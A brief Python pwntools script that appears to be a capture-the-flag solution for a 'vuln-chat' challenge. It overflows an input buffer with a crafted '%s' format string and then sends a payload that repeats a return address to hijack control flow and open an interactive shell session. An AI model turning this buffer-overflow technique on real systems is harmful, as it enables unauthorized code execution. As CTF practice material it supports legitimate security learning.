from pwn import *

# Run process
context.arch = 'i386'
r = process(['./vuln-chat'])
#r = remote('vulnchat.tuctf.com',4141)
"""

# Wait for debugger
pid = util.proc.pidof(r)[0]
print "The pid is: "+str(pid)
util.proc.wait_for_debugger(pid)
"""

# Get the leaks and build the payload
payload = 'A' + pack(0x0804856b)*20

# Exploit
r.sendline('A'*20 + '%s')
r.sendline(payload)
r.interactive()
